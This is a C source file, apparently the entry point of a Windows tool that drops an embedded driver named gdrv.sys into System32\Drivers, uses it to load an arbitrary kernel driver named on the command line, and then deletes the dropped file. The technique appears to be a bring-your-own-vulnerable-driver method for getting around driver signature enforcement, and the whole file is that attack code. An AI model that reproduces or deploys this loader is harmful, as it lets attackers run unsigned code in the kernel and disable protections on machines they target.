#include "global.h"
#include "binary/dropper.h"

const wchar_t* DriverPath = L"C:\\Windows\\System32\\Drivers\\gdrv.sys";

int wmain(int argc, wchar_t** argv)
{
    const wchar_t* target_driver;
    const wchar_t* action;

    if (argc < 3) {
        return false;
    }

    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    action = argv[1];
    target_driver = argv[2];

    if (wcscmp(action, L"LOAD") == 0 || wcscmp(action, L"load") == 0)
    {
        if (DropDriverFromBytes(DriverPath))
        {
            Status = WindLoadDriver((PWCHAR)DriverPath, (PWCHAR)target_driver, FALSE);

            if (!NT_SUCCESS(Status))
                return false;

            DeleteFile((PWSTR)DriverPath);
        }
    }
    else if (wcscmp(action, L"UNLOAD") == 0 || wcscmp(action, L"unload") == 0)
    {
        Status = WindUnloadDriver((PWCHAR)target_driver, 0);
        if (!NT_SUCCESS(Status))
            return false;
    }
    else {
        return false;
    }

    if (!NT_SUCCESS(Status))
        return false;

    return true;
}
